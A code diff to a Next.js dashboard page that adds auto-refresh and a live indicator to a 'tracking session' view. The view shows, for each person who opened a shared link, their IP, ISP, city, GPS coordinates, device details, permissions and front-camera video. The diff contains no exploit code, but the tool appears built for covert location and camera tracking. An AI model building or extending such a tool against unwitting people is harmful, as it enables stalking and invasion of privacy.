@@ -1,6 +1,6 @@
 "use client";
 
-import { useEffect, useState, use } from "react";
+import { useEffect, useState, use, useCallback } from "react";
 import Link from "next/link";
 
 export default function SessionDetail({ params }) {
@@ -8,7 +8,17 @@ export default function SessionDetail({ params }) {
   const [session, setSession] = useState(null);
   const [events, setEvents] = useState([]);
   const [loading, setLoading] = useState(true);
+  const [lastRefresh, setLastRefresh] = useState(null);
 
+  const fetchEvents = useCallback(async () => {
+    const eventsRes = await fetch(
+      `${process.env.NEXT_PUBLIC_STRAPI_URL}/api/tracking-events?filters[session][documentId][$eq]=${sessionId}&sort=triggered_at:desc`
+    ).then(r => r.json());
+    setEvents(eventsRes.data || []);
+    setLastRefresh(new Date());
+  }, [sessionId]);
+
+  // Initial load — fetch both session and events
   useEffect(() => {
     Promise.all([
       fetch(`${process.env.NEXT_PUBLIC_STRAPI_URL}/api/tracking-sessions/${sessionId}`).then(r => r.json()),
@@ -16,9 +26,21 @@ export default function SessionDetail({ params }) {
     ]).then(([sessionData, eventsData]) => {
       setSession(sessionData.data);
       setEvents(eventsData.data || []);
+      setLastRefresh(new Date());
       setLoading(false);
     });
   }, [sessionId]);
+
+  // Auto-refresh events every 10 seconds — only when session is active
+  useEffect(() => {
+    if (!session || session.status1 !== "active") return;
+
+    const interval = setInterval(() => {
+      fetchEvents();
+    }, 10000);
+
+    return () => clearInterval(interval);
+  }, [session, fetchEvents]);
 
   const copyLink = () => {
     if (!session) return;
@@ -34,6 +56,7 @@ export default function SessionDetail({ params }) {
     );
     setEvents(prev => prev.filter(e => e.documentId !== eventDocumentId));
   };
+
   const toggleStatus = async () => {
     const newStatus = session.status1 === "active" ? "closed" : "active";
     await fetch(
@@ -46,6 +69,7 @@ export default function SessionDetail({ params }) {
     );
     setSession(prev => ({ ...prev, status1: newStatus }));
   };
+
   if (loading) return (
     <div style={{ padding: "32px", color: "var(--text3)" }}>Loading...</div>
   );
@@ -53,6 +77,8 @@ export default function SessionDetail({ params }) {
   if (!session) return (
     <div style={{ padding: "32px", color: "var(--text3)" }}>Session not found</div>
   );
+
+  const isActive = session.status1 === "active";
 
   return (
     <div style={{ padding: "32px" }}>
@@ -84,23 +110,44 @@ export default function SessionDetail({ params }) {
             }}>
               {session.status1}
             </span>
+
+            {/* Live indicator — only shown when active */}
+            {isActive && (
+              <span style={{
+                display: "flex", alignItems: "center", gap: "5px",
+                fontSize: "11px", color: "#1D9E75"
+              }}>
+                <span style={{
+                  width: "6px", height: "6px", borderRadius: "50%",
+                  background: "#1D9E75",
+                  boxShadow: "0 0 0 2px rgba(29,158,117,0.3)",
+                  display: "inline-block"
+                }} />
+                Live · refreshes every 10s
+              </span>
+            )}
           </div>
           <p style={{ fontSize: "13px", color: "var(--text2)", marginTop: "4px" }}>
             {session.session_id} · {events.length} {events.length === 1 ? "event" : "events"} captured
+            {lastRefresh && (
+              <span style={{ color: "var(--text3)", marginLeft: "8px" }}>
+                · last checked {lastRefresh.toLocaleTimeString("en-IN", { hour: "2-digit", minute: "2-digit", second: "2-digit" })}
+              </span>
+            )}
           </p>
         </div>
         <button
           onClick={toggleStatus}
           style={{
             background: "transparent",
-            border: `0.5px solid ${session.status1 === "active" ? "#BA7517" : "#1D9E75"}`,
+            border: `0.5px solid ${isActive ? "#BA7517" : "#1D9E75"}`,
             borderRadius: "8px", padding: "9px 18px",
             fontSize: "13px",
-            color: session.status1 === "active" ? "#BA7517" : "#1D9E75",
+            color: isActive ? "#BA7517" : "#1D9E75",
             cursor: "pointer"
           }}
         >
-          {session.status1 === "active" ? "🔒 Close Session" : "🔓 Reopen Session"}
+          {isActive ? "🔒 Close Session" : "🔓 Reopen Session"}
         </button>
         <button
           onClick={copyLink}
@@ -182,13 +229,10 @@ export default function SessionDetail({ params }) {
               </div>
 
               <div style={{ display: "grid", gridTemplateColumns: "repeat(auto-fill, minmax(200px, 1fr))", gap: "10px" }}>
-
-                {/* Network */}
                 <InfoCard label="IP Address" value={event.ip_address} icon="🌐" />
                 <InfoCard label="ISP" value={event.isp || "Unknown"} icon="📡" />
                 <InfoCard label="Location" value={`${event.city}, ${event.country}`} icon="📍" />
 
-                {/* GPS */}
                 {event.latitude && event.longitude && (
                   <InfoCard
                     label="GPS Coordinates"
@@ -198,13 +242,11 @@ export default function SessionDetail({ params }) {
                   />
                 )}
 
-                {/* Device */}
                 <InfoCard label="Device" value={event.device_type || "Unknown"} icon="📱" />
                 <InfoCard label="OS" value={event.os || "Unknown"} icon="💻" />
                 <InfoCard label="Browser" value={event.browser || "Unknown"} icon="🔍" />
                 <InfoCard label="Screen" value={event.screen_resolution || "Unknown"} icon="🖥️" />
 
-                {/* Permissions */}
                 <div style={{
                   background: "var(--bg2)", borderRadius: "8px",
                   padding: "12px", border: "0.5px solid var(--border)"
@@ -225,10 +267,8 @@ export default function SessionDetail({ params }) {
                     ))}
                   </div>
                 </div>
-
               </div>
 
-              {/* Map link if GPS available */}
               {event.latitude && event.longitude && (
                 <div style={{ marginTop: "12px" }}>
                   <a
@@ -245,32 +285,30 @@ export default function SessionDetail({ params }) {
                 </div>
               )}
 
-              {/* Front camera video */}
-                {event.front_video && (
+              {event.front_video && (
                 <div style={{ marginTop: "12px" }}>
-                    <div style={{
+                  <div style={{
                     fontSize: "10px", color: "var(--text3)",
                     textTransform: "uppercase", letterSpacing: "0.8px",
                     marginBottom: "8px"
-                    }}>
+                  }}>
                     🎥 Front Camera Recording
-                    </div>
-                    <video
+                  </div>
+                  <video
                     src={event.front_video.startsWith("http")
                       ? event.front_video
                       : `${process.env.NEXT_PUBLIC_STRAPI_URL}${event.front_video}`}
                     controls
                     style={{
-                        width: "320px", height: "240px",
-                        borderRadius: "8px",
-                        border: "0.5px solid var(--border)",
-                        background: "#000"
+                      width: "320px", height: "240px",
+                      borderRadius: "8px",
+                      border: "0.5px solid var(--border)",
+                      background: "#000"
                     }}
-                    />
+                  />
                 </div>
-                )}
+              )}
 
-              {/* User agent */}
               <div style={{ marginTop: "12px", padding: "10px", background: "var(--bg2)", borderRadius: "8px" }}>
                 <div style={{ fontSize: "10px", color: "var(--text3)", textTransform: "uppercase", letterSpacing: "0.8px", marginBottom: "4px" }}>
                   User Agent
